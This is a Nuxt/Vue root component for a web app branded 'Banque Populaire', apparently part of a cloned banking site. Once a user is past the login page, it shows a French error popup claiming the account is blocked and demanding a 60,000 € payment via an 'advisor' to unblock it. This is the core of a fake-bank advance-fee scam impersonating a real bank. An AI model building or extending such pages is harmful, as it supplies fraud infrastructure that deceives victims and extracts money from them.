<template>
  <NuxtLayout :style="{ '--primary-rgb': bankData.primaryColor }">
    <NuxtLoadingIndicator />
    <!-- here -->
    <NuxtPage />
  </NuxtLayout>
</template>
<script setup lang="ts">
import * as bankData from '@/data/financialData.js';
import Swal from 'sweetalert2';
const getImagePath = (imageName: any) => {
  const publicPath = import.meta.env.BASE_URL || '/nuxt/';
  return `${publicPath}${imageName}`;
}

onMounted(async () => {
const { $router } = useNuxtApp()

if ($router.currentRoute.value.path !== '/auth/login') {
  Swal.fire('Erreur', "Votre compte est temporairement bloqué. Vous devez vous acquittez d'un montant de 60 000 € afin de débloquer le compte.\n" +
      "\n" +
      "Merci de contacter votre conseiller pour finaliser cette opération", 'error');

}
  
});

useHead({
  title: 'Banque Populaire',
  // link: [{ rel: 'icon', type: 'image/png', href: getImagePath('images/brand-logos/favicon.ico') }]
})
</script>
<style>
.me-5 {
  margin-inline-end: 3rem !important;
}

:root {
  --primary-rgb: 47, 149, 206; /* Définit la couleur primaire en rouge */
}
</style>


<script lang="ts">
export default {
};
</script>
